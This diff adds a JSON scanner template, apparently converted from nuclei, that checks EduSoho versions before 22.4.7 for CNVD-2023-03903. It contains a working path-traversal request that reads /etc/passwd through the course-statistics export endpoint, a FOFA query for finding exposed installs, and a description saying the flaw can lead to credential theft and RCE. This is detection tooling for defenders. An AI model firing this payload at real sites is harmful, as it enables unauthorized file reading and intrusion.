@@ -1,0 +1,164 @@
+{
+  "id": "CNVD-2023-03903",
+  "name": "EduSoho \u003c v22.4.7 - Local File Inclusion",
+  "author": "s4e-io",
+  "severity": "HIGH",
+  "description": "The edusoho education and training system \u003cv22.4.7 has unauthorized file reading vulnerability. Through this vulnerability, an attacker can read the contents of the config/parameters.yml file and obtain sensitive information such as the secret value saved in the file and database account password. After the secret value is obtained, an attacker can implement RCE with symfony _fragment routing.\n",
+  "references": [
+    "https://blog.csdn.net/qq_41904294/article/details/135007351",
+    "https://github.com/gobysec/GobyVuls/blob/master/CNVD-2023-03903.md"
+  ],
+  "tags": [
+    "cnvd",
+    "cnvd2023",
+    "lfi",
+    "edushoho"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {
+    "fofa": "title\u003d\"Powered By EduSoho\" || body\u003d\"Powered by \u003ca href\u003d\\\"http://www.edusoho.com/\\\" target\u003d\\\"_blank\\\"\u003eEduSoho\" || (body\u003d\"Powered By EduSoho\" \u0026\u0026 body\u003d\"var app\")"
+  },
+  "variables": {},
+  "variablesType": "sniper",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "raw": [
+        "GET /export/classroom-course-statistics?fileNames[]\u003d../../../../../../../etc/passwd HTTP/1.1\nHost: {{Hostname}}\n"
+      ],
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "REGEX",
+          "part": "body",
+          "values": [
+            "root:.*:0:0:"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "internal": "true",
+          "group": 1
+        },
+        {
+          "type": "WORD",
+          "part": "content_type",
+          "values": [
+            "text/csv"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        },
+        {
+          "type": "STATUS",
+          "values": [
+            "200"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "AND",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "CNVD-2023-03903",
+    "info": {
+      "name": "EduSoho \u003c v22.4.7 - Local File Inclusion",
+      "author": "s4e-io",
+      "severity": "high",
+      "description": "The edusoho education and training system \u003cv22.4.7 has unauthorized file reading vulnerability. Through this vulnerability, an attacker can read the contents of the config/parameters.yml file and obtain sensitive information such as the secret value saved in the file and database account password. After the secret value is obtained, an attacker can implement RCE with symfony _fragment routing.\n",
+      "reference": [
+        "https://blog.csdn.net/qq_41904294/article/details/135007351",
+        "https://github.com/gobysec/GobyVuls/blob/master/CNVD-2023-03903.md"
+      ],
+      "metadata": {
+        "max_request": 1,
+        "fofa_query": "title\u003d\"Powered By EduSoho\" || body\u003d\"Powered by \u003ca href\u003d\\\"http://www.edusoho.com/\\\" target\u003d\\\"_blank\\\"\u003eEduSoho\" || (body\u003d\"Powered By EduSoho\" \u0026\u0026 body\u003d\"var app\")"
+      },
+      "tags": "cnvd,cnvd2023,lfi,edushoho"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "redirects": false,
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "raw": [
+          "GET /export/classroom-course-statistics?fileNames[]\u003d../../../../../../../etc/passwd HTTP/1.1\nHost: {{Hostname}}\n"
+        ],
+        "matchers_condition": "and",
+        "matchers": [
+          {
+            "type": "regex",
+            "part": "body",
+            "regex": [
+              "root:.*:0:0:"
+            ],
+            "group": 1,
+            "internal": true
+          },
+          {
+            "type": "word",
+            "negative": false,
+            "part": "content_type",
+            "words": [
+              "text/csv"
+            ],
+            "case_insensitive": false
+          },
+          {
+            "type": "status",
+            "status": [
+              200
+            ]
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
